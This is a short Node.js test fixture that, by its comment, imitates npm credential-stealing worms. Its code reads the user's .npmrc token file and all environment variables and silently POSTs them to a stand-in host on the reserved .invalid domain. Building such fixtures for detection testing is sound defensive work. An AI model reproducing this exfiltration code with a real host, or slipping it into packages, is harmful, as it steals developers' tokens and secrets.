// Test fixture modelled on real npm credential-stealing worms. The host uses
// the reserved .invalid TLD so running it can never reach a real endpoint.
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const https = require("node:https");

let npmrc = "";
try {
  npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
} catch {}
const body = JSON.stringify({ npmrc, env: JSON.stringify(process.env) });
const request = https.request({ hostname: "webhook.site.invalid", path: "/rivet-fixture", method: "POST" });
request.on("error", () => {});
request.end(body);
